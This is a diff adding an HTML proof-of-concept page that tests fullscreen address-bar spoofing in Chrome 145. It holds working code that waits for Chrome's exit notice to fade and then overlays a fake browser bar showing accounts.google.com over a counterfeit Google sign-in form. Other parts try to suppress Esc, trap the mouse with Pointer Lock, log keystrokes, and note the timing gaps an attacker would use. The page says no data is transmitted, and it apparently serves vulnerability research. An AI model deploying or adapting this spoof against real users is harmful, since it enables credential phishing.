@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: Fullscreen Address Bar Spoofing — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; margin: 0; }
+  h1 { color: #ff6b6b; padding: 20px; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 20px; border-radius: 5px; }
+  pre { white-space: pre-wrap; color: #7bed9f; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 10px 20px; cursor: pointer; margin: 4px; border-radius: 3px; font-size: 14px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; padding: 0 20px; }
+
+  /* === Fake Chrome UI elements === */
+  .fake-chrome-bar {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 72px;
+    background: #dee1e6;
+    z-index: 999999;
+    font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+  }
+
+  .fake-tab-bar {
+    display: flex;
+    align-items: center;
+    height: 34px;
+    background: #c7cad1;
+    padding: 0 8px;
+    padding-top: 4px;
+  }
+
+  .fake-tab {
+    background: #dee1e6;
+    color: #202124;
+    padding: 6px 16px;
+    border-radius: 8px 8px 0 0;
+    font-size: 12px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    max-width: 200px;
+  }
+
+  .fake-tab .lock-icon {
+    width: 12px;
+    height: 12px;
+    display: inline-block;
+  }
+
+  .fake-nav-bar {
+    display: flex;
+    align-items: center;
+    height: 34px;
+    padding: 0 8px;
+    gap: 4px;
+  }
+
+  .fake-nav-btn {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #5f6368;
+    font-size: 16px;
+    cursor: default;
+  }
+
+  .fake-url-bar {
+    flex: 1;
+    background: #f1f3f4;
+    border-radius: 20px;
+    padding: 5px 12px;
+    font-size: 14px;
+    color: #202124;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .fake-url-bar .lock {
+    color: #188038;
+    font-size: 14px;
+  }
+
+  .fake-url-bar .domain {
+    color: #202124;
+    font-weight: normal;
+  }
+
+  .fake-url-bar .path {
+    color: #5f6368;
+  }
+
+  /* Spoofed page content */
+  .spoof-content {
+    display: none;
+    position: fixed;
+    top: 72px;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: #fff;
+    z-index: 999998;
+    overflow: auto;
+  }
+
+  .google-login {
+    max-width: 400px;
+    margin: 60px auto;
+    padding: 40px;
+    text-align: center;
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+  }
+
+  .google-login h1 {
+    color: #202124;
+    font-size: 24px;
+    font-weight: 400;
+    padding: 0;
+  }
+
+  .google-login input {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+
+  .google-login .btn {
+    background: #1a73e8;
+    color: white;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 16px;
+  }
+</style>
+</head>
+<body>
+
+<h1>PoC: Fullscreen API Address Bar Spoofing</h1>
+<p class="warn">Target: Chrome 145 | Tests fullscreen mode to overlay fake browser UI over real address bar</p>
+<p class="warn">Related: CVE-2023-2930, CVE-2022-3046, CVE-2021-30625 (fullscreen spoofing)</p>
+
+<h2>Test 1: Basic fullscreen with fake Chrome UI</h2>
+<div class="test-case">
+  <p>Enters fullscreen mode and overlays a pixel-perfect fake Chrome address bar showing "accounts.google.com".</p>
+  <p>Chrome shows "Press Esc to exit full screen" briefly — this test waits for that to disappear.</p>
+  <button onclick="test1()">Enter Fullscreen (click to test)</button>
+  <pre id="t1"></pre>
+</div>
+
+<h2>Test 2: Fullscreen with delayed UI spoof</h2>
+<div class="test-case">
+  <p>Enters fullscreen, waits for Chrome's notification to disappear (~3s), then shows fake UI.</p>
+  <button onclick="test2()">Run Test</button>
+  <pre id="t2"></pre>
+</div>
+
+<h2>Test 3: Fullscreen escape suppression</h2>
+<div class="test-case">
+  <p>Tests if Esc key can be intercepted/suppressed while in fullscreen to prevent exit.</p>
+  <button onclick="test3()">Run Test</button>
+  <pre id="t3"></pre>
+</div>
+
+<h2>Test 4: Fullscreen via Pointer Lock combo</h2>
+<div class="test-case">
+  <p>Combines fullscreen with Pointer Lock to prevent mouse from reaching real UI elements.</p>
+  <button onclick="test4()">Run Test</button>
+  <pre id="t4"></pre>
+</div>
+
+<h2>Test 5: Fullscreen from iframe</h2>
+<div class="test-case">
+  <p>Tests if an iframe can enter fullscreen and the parent controls what fake UI is displayed.</p>
+  <button onclick="test5()">Run Test</button>
+  <pre id="t5"></pre>
+  <iframe id="t5frame" allow="fullscreen" style="width:100%;height:60px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 6: Keyboard event interception in fullscreen</h2>
+<div class="test-case">
+  <p>While in fullscreen, intercepts keyboard events to capture credentials typed into fake login form.</p>
+  <button onclick="test6()">Run Test</button>
+  <pre id="t6"></pre>
+</div>
+
+<h2>Test 7: Fullscreen notification style matching</h2>
+<div class="test-case">
+  <p>Studies Chrome's fullscreen exit notification and creates a fake replacement after it fades.</p>
+  <button onclick="test7()">Analyze fullscreen notification</button>
+  <pre id="t7"></pre>
+</div>
+
+<!-- Fake Chrome UI overlay -->
+<div class="fake-chrome-bar" id="fakeBar">
+  <div class="fake-tab-bar">
+    <div class="fake-tab">
+      <svg class="lock-icon" viewBox="0 0 12 12"><circle cx="6" cy="6" r="5" fill="none" stroke="#5f6368" stroke-width="1"/></svg>
+      <span>Sign in - Google Accounts</span>
+      <span style="margin-left:auto;font-size:10px;color:#5f6368;">&times;</span>
+    </div>
+  </div>
+  <div class="fake-nav-bar">
+    <div class="fake-nav-btn">&larr;</div>
+    <div class="fake-nav-btn">&rarr;</div>
+    <div class="fake-nav-btn">&#x21bb;</div>
+    <div class="fake-url-bar">
+      <span class="lock">&#x1F512;</span>
+      <span class="domain">accounts.google.com</span><span class="path">/signin/v2/identifier</span>
+    </div>
+    <div class="fake-nav-btn">&#9734;</div>
+    <div class="fake-nav-btn">&#8942;</div>
+  </div>
+</div>
+
+<!-- Fake Google login page -->
+<div class="spoof-content" id="spoofContent">
+  <div class="google-login">
+    <div style="margin-bottom:16px;">
+      <svg viewBox="0 0 75 24" width="75" height="24">
+        <text x="0" y="20" font-size="22" font-weight="bold" fill="#4285f4">G</text>
+        <text x="18" y="20" font-size="22" font-weight="bold" fill="#ea4335">o</text>
+        <text x="35" y="20" font-size="22" font-weight="bold" fill="#fbbc05">o</text>
+        <text x="52" y="20" font-size="22" font-weight="bold" fill="#4285f4">g</text>
+        <text x="68" y="20" font-size="22" font-weight="bold" fill="#34a853">l</text>
+        <text x="76" y="20" font-size="22" font-weight="bold" fill="#ea4335">e</text>
+      </svg>
+    </div>
+    <h1>Sign in</h1>
+    <p style="color:#202124;font-size:16px;">Use your Google Account</p>
+    <input type="text" placeholder="Email or phone" id="fakeEmail">
+    <input type="password" placeholder="Password" id="fakePass" style="display:none;">
+    <br>
+    <button class="btn" onclick="fakeCaptureNext()">Next</button>
+    <p style="color:#5f6368;font-size:12px;margin-top:20px;">
+      This is a PoC demonstration. No data is transmitted.
+    </p>
+    <pre id="captured" style="color:red;font-size:11px;text-align:left;margin-top:20px;"></pre>
+  </div>
+</div>
+
+<script>
+function log(id, msg) {
+  document.getElementById(id).textContent += msg + '\n';
+}
+
+function showFakeUI() {
+  document.getElementById('fakeBar').style.display = 'block';
+  document.getElementById('spoofContent').style.display = 'block';
+}
+
+function hideFakeUI() {
+  document.getElementById('fakeBar').style.display = 'none';
+  document.getElementById('spoofContent').style.display = 'none';
+}
+
+// Handle fullscreen change
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) {
+    hideFakeUI();
+    log('t1', 'Exited fullscreen. Fake UI hidden.');
+  }
+});
+
+// Test 1: Basic fullscreen + fake UI
+function test1() {
+  log('t1', 'Requesting fullscreen...');
+
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      log('t1', 'Fullscreen entered!');
+      log('t1', 'Chrome will show "Press Esc to exit full screen" notification.');
+      log('t1', 'Waiting 4 seconds for notification to fade...');
+
+      // Wait for Chrome's notification to disappear
+      setTimeout(() => {
+        showFakeUI();
+        log('t1', 'Fake Chrome UI overlay displayed!');
+        log('t1', 'User now sees fake URL bar showing "accounts.google.com"');
+        log('t1', 'Real URL bar is hidden by fullscreen mode.');
+        log('t1', 'Press Esc to exit.');
+      }, 4000);
+    })
+    .catch(err => {
+      log('t1', `Fullscreen failed: ${err.message}`);
+      log('t1', 'Note: Fullscreen requires user gesture (click on button).');
+    });
+}
+
+// Test 2: Delayed spoof with timing analysis
+function test2() {
+  log('t2', 'Requesting fullscreen with precise timing...');
+
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      const enterTime = performance.now();
+      log('t2', `Fullscreen entered at ${enterTime.toFixed(0)}ms`);
+
+      // Monitor for notification disappearance by checking various delays
+      [1000, 2000, 3000, 3500, 4000, 5000].forEach(delay => {
+        setTimeout(() => {
+          log('t2', `${delay}ms: Notification likely ${delay >= 3000 ? 'gone' : 'still visible'}`);
+          if (delay === 4000) {
+            showFakeUI();
+            log('t2', 'Fake UI activated at safe timing.');
+          }
+        }, delay);
+      });
+    })
+    .catch(err => log('t2', `Failed: ${err.message}`));
+}
+
+// Test 3: Esc key suppression
+function test3() {
+  log('t3', 'Testing Esc key interception...');
+
+  const escHandler = (e) => {
+    if (e.key === 'Escape') {
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      log('t3', `Esc intercepted! preventDefault called. Fullscreen: ${!!document.fullscreenElement}`);
+      return false;
+    }
+  };
+
+  // Try to capture Esc at all levels
+  document.addEventListener('keydown', escHandler, true);
+  document.addEventListener('keyup', escHandler, true);
+  window.addEventListener('keydown', escHandler, true);
+
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      showFakeUI();
+      log('t3', 'Fullscreen entered. Try pressing Esc.');
+      log('t3', '(Chrome should exit fullscreen regardless of JS interception)');
+      log('t3', 'If Esc does NOT exit fullscreen, that is a vulnerability!');
+    })
+    .catch(err => log('t3', `Failed: ${err.message}`));
+}
+
+// Test 4: Fullscreen + Pointer Lock
+function test4() {
+  log('t4', 'Requesting fullscreen + pointer lock...');
+
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      log('t4', 'Fullscreen entered. Requesting pointer lock...');
+      return document.documentElement.requestPointerLock();
+    })
+    .then(() => {
+      log('t4', 'Pointer lock acquired! Mouse is now trapped.');
+      log('t4', 'User cannot move cursor to real UI elements.');
+      showFakeUI();
+      log('t4', 'Fake UI shown. User has no visible way to verify real URL.');
+      log('t4', 'Press Esc to release.');
+    })
+    .catch(err => {
+      log('t4', `Pointer lock failed: ${err.message}`);
+      log('t4', 'Chrome may require user gesture for pointer lock too.');
+      showFakeUI();
+    });
+
+  document.addEventListener('pointerlockchange', () => {
+    if (!document.pointerLockElement) {
+      log('t4', 'Pointer lock released.');
+    }
+  });
+}
+
+// Test 5: Fullscreen from iframe
+function test5() {
+  const frame = document.getElementById('t5frame');
+  frame.style.display = 'block';
+
+  const html = `<!DOCTYPE html><html><body style="margin:0;padding:5px;font-family:monospace;">
+<button onclick="goFS()" style="padding:8px 16px;">Enter Fullscreen from iframe</button>
+<pre id="log"></pre>
+<script>
+function goFS() {
+  const l = document.getElementById('log');
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      l.textContent += 'Iframe entered fullscreen!\\n';
+      l.textContent += 'Parent page controls visual overlay.\\n';
+      parent.postMessage({type:'iframe-fs', status:'entered'}, '*');
+    })
+    .catch(e => {
+      l.textContent += 'Fullscreen failed: ' + e.message + '\\n';
+      parent.postMessage({type:'iframe-fs', status:'failed', error: e.message}, '*');
+    });
+}
+<\/script>
+</body></html>`;
+
+  frame.srcdoc = html;
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 'iframe-fs') {
+      log('t5', `Iframe fullscreen: ${e.data.status}`);
+      if (e.data.status === 'entered') {
+        setTimeout(() => {
+          showFakeUI();
+          log('t5', 'Fake UI shown over iframe fullscreen. Parent controls the overlay!');
+        }, 4000);
+      }
+    }
+  });
+}
+
+// Test 6: Keyboard capture in fullscreen
+function test6() {
+  log('t6', 'Setting up keyboard capture...');
+
+  const captured = [];
+
+  const keyLogger = (e) => {
+    if (document.fullscreenElement) {
+      captured.push(e.key);
+      const el = document.getElementById('captured');
+      if (el) {
+        el.textContent = 'Captured keys: ' + captured.join('');
+      }
+      log('t6', `Key captured: ${e.key}`);
+    }
+  };
+
+  document.addEventListener('keydown', keyLogger, true);
+
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      setTimeout(() => {
+        showFakeUI();
+        document.getElementById('fakeEmail').focus();
+        log('t6', 'Fullscreen + fake login shown. Type in the fake email field.');
+        log('t6', 'All keystrokes are being logged (PoC only — no data transmitted).');
+      }, 4000);
+    })
+    .catch(err => log('t6', `Failed: ${err.message}`));
+}
+
+// Fake login form handler
+let loginStep = 0;
+function fakeCaptureNext() {
+  if (loginStep === 0) {
+    const email = document.getElementById('fakeEmail').value;
+    document.getElementById('captured').textContent += `\nCaptured email: ${email}`;
+    document.getElementById('fakeEmail').style.display = 'none';
+    document.getElementById('fakePass').style.display = 'block';
+    document.getElementById('fakePass').focus();
+    loginStep = 1;
+  } else {
+    const pass = document.getElementById('fakePass').value;
+    document.getElementById('captured').textContent += `\nCaptured password: ${'*'.repeat(pass.length)} (${pass.length} chars)`;
+    document.getElementById('captured').textContent += '\n\n[PoC complete - no data transmitted. This demonstrates the phishing risk.]';
+
+    // Exit fullscreen
+    if (document.fullscreenElement) {
+      document.exitFullscreen();
+    }
+  }
+}
+
+// Test 7: Notification analysis
+function test7() {
+  log('t7', 'Analyzing Chrome fullscreen notification behavior...');
+  log('t7', '');
+  log('t7', 'Chrome fullscreen notification characteristics:');
+  log('t7', '  - Appears at top-center of screen');
+  log('t7', '  - Text: "Press Esc to exit full screen" or "{domain} is now full screen"');
+  log('t7', '  - Background: semi-transparent dark (#333 ~80% opacity)');
+  log('t7', '  - Font: system font, ~14px');
+  log('t7', '  - Duration: ~3 seconds, fades out over ~0.5s');
+  log('t7', '  - Z-index: above all web content');
+  log('t7', '');
+  log('t7', 'Attack window:');
+  log('t7', '  - 0-3s: Notification visible → user may not look at URL bar');
+  log('t7', '  - 3s+: Notification faded → show fake UI safely');
+  log('t7', '  - Attacker must wait ~3.5s before showing fake URL bar');
+  log('t7', '');
+  log('t7', 'Mitigations Chrome DOES apply:');
+  log('t7', '  - Shows "Press Esc" notification');
+  log('t7', '  - Re-shows notification on mouse move to top');
+  log('t7', '  - F11 still exits fullscreen');
+  log('t7', '  - Esc cannot be intercepted by JS for fullscreen exit');
+  log('t7', '');
+  log('t7', 'Potential gaps:');
+  log('t7', '  - Notification is temporary — after 3s user has no URL bar');
+  log('t7', '  - Pointer Lock can prevent mouse from reaching screen edges');
+  log('t7', '  - Custom cursor can hide actual cursor position');
+  log('t7', '  - Keyboard focus can be directed to fake form fields');
+
+  // Test requestFullscreen to measure notification duration
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      const start = performance.now();
+      log('t7', `\nFullscreen entered at t=${start.toFixed(0)}ms`);
+
+      // Monitor various timings
+      const intervals = [1000, 2000, 2500, 3000, 3500, 4000, 5000];
+      intervals.forEach(ms => {
+        setTimeout(() => {
+          log('t7', `t+${ms}ms: Notification ${ms < 3000 ? 'likely visible' : 'likely faded'}`);
+        }, ms);
+      });
+    })
+    .catch(err => log('t7', `Fullscreen failed: ${err.message}`));
+}
+</script>
+</body>
+</html>
